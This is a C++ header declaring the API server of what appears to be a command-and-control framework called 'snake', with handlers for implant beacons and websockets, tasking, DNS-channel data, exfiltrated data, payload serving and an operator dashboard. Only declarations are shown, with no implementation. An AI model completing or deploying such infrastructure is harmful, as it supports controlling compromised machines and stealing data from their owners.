#pragma once

#include <atomic>
#include <map>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include "snake/crypto.hpp"
#include "snake/httpd.hpp"
#include "snake/store.hpp"

namespace snake::api {

struct Config {
    std::string listen = ":4443";
    std::string c2_id;
    Bytes session_key;
    bool tls_enabled = false;
    std::string tls_cert;
    std::string tls_key;
    store::Store* store = nullptr;
    std::string dashboard_pw;
    std::string payloads_dir = "payloads";
    std::string dashboard_html;
};

std::string implant_to_json(const store::ImplantRecord& ir);
std::string mesh_node_to_json(const store::MeshNode& n);
std::string rfc3339_nano(int64_t unix_nanos);

std::string sign_operator_jwt(const Bytes& session_key, int64_t iat);
bool verify_operator_jwt(const Bytes& session_key, const std::string& token, std::string* claims,
                         int64_t* exp);

bool bcrypt_check(const std::string& hash, const std::string& password);

std::string ws_accept_key(const std::string& key);

const std::string& embedded_dashboard_html();

class Server {
  public:
    explicit Server(Config cfg);
    ~Server();
    Server(const Server&) = delete;
    Server& operator=(const Server&) = delete;

    bool start(std::string* err);
    void stop();

    http::Response handle(const http::Request& req, http::Conn* conn);

    uint16_t port() const { return http_.port(); }
    const Bytes& public_key() const { return pub_key_; }
    size_t dashboard_token_count();

  private:
    struct Route {
        std::string pattern;
        bool auth = false;
        bool exact = false;
        void (Server::*fn)(const http::Request&, http::Response&, http::Conn*);
    };

    void register_routes();
    const Route* match_route(const std::string& path) const;
    void route_request(const http::Request& req, http::Response& res, http::Conn* conn);

    bool authorized(const http::Request&, http::Response&);
    bool password_ok(const std::string& given);

    void handle_implant_ws(const http::Request&, http::Response&, http::Conn*);
    void handle_implant_beacon(const http::Request&, http::Response&, http::Conn*);
    void handle_implant_result(const http::Request&, http::Response&, http::Conn*);
    void handle_dns_receive(const http::Request&, http::Response&, http::Conn*);
    void handle_dashboard_login(const http::Request&, http::Response&, http::Conn*);
    void handle_list_implants(const http::Request&, http::Response&, http::Conn*);
    void handle_implant_detail(const http::Request&, http::Response&, http::Conn*);
    void handle_create_task(const http::Request&, http::Response&, http::Conn*);
    void handle_implant_tasks(const http::Request&, http::Response&, http::Conn*);
    void handle_list_peers(const http::Request&, http::Response&, http::Conn*);
    void handle_get_config(const http::Request&, http::Response&, http::Conn*);
    void handle_exfil_data(const http::Request&, http::Response&, http::Conn*);
    void handle_serve_payload(const http::Request&, http::Response&, http::Conn*);
    void handle_list_payloads(const http::Request&, http::Response&, http::Conn*);
    void handle_dashboard_ui(const http::Request&, http::Response&, http::Conn*);
    void handle_catch_all(const http::Request&, http::Response&, http::Conn*);

    Config cfg_;
    http::Server http_;
    std::vector<Route> routes_;
    std::thread runner_;
    std::atomic<bool> running_{false};
    int64_t start_time_ns_ = 0;
    Bytes pub_key_;

    std::mutex mu_;
    std::map<std::string, int64_t> dash_tokens_;
};

void http_error(http::Response& res, const std::string& msg, int code);
void write_json(http::Response& res, const std::string& body);

}  // namespace snake::api
